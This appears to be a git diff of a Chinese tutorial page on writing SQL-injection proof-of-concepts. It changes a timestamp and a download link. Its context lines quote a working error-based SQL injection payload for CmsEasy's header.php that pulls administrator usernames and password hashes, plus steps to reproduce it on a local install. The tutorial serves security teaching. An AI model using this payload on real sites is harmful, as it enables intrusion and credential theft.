@@ -52,7 +52,7 @@
 <meta property="og:image" content="http://i4.tietuku.com/bb2a85f4bae761ce.png">
 <meta property="og:image" content="http://i4.tietuku.com/daaf9419eefa4cc0.png">
 <meta property="og:image" content="http://i4.tietuku.com/1a2a1e041d91e6b6.png">
-<meta property="og:updated_time" content="2015-12-28T08:59:27.000Z">
+<meta property="og:updated_time" content="2015-12-28T09:07:18.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PoC 编写指南(第 2 章 SQL 注入类 PoC 编写)">
 <meta name="twitter:description" content="2.1 SQL 注入基础准备完这些通用的基础知识之后，我们就可以开始编写自己的第一个 PoC 了。为什么要选 SQL 注入作第一个呢？因为它最常见，相信看本教程的你肯定在这之前都了解了，没了解我也装作你了解了给你讲，你上学的时候老师不都这么干的嘛。
@@ -317,7 +317,7 @@
 <p>阅读原文后我们得到了 payload 和 目标 URL.</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">请求的链接：</span><br><span class="line"></span><br><span class="line">http://xxx.com/celive/live/header.php</span><br><span class="line"></span><br><span class="line">POST 数据内容：</span><br><span class="line"></span><br><span class="line">xajax=LiveMessage&amp;xajaxargs[0][name]=1',(<span class="operator"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(<span class="keyword">select</span> <span class="keyword">concat</span>(username,<span class="number">0x23</span>,<span class="keyword">password</span>) <span class="keyword">from</span> cmseasy_user <span class="keyword">where</span> groupid=<span class="number">2</span> <span class="keyword">limit</span> <span class="number">1</span>))a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a)b),<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'1'</span>,<span class="string">'127.0.0.1'</span>,<span class="string">'2'</span>)#</span></span><br></pre></td></tr></table></figure>
 <h3 id="2-2-2_漏洞复现">2.2.2 漏洞复现</h3><p> 一般来说不推荐使用已经在线的站点做测试，因为一旦目标跑了一个比较重要的业务，倘若出了点问题，会对目标造成不可估量的损害。</p>
-<p> <a href="">下载地址</a></p>
+<p> <a href="http://pan.baidu.com/s/1i4lAwBF" target="_blank" rel="external">下载地址</a></p>
 <p> 读者下载完安装包后，按照官方说明安装 CmsEasy 安装包。安装过程就不在此缀述。我将 其安装在网站目录下的 cmseasy 目录中。</p>
 <p> 安装完毕后，我们就可以进行手工复现利用过程了。</p>
 <p> 该漏洞的注入点在 POST 数据部分，我们需要发起一个 POST 请求，我们选择 Firefox 浏览器和 HackBar 插件。填上目标 url 和 payload，然后发送。可以看到返回页面报错，而报错信息中出现了 cmseasy_user 表中的数据(图 2-1)。</p>
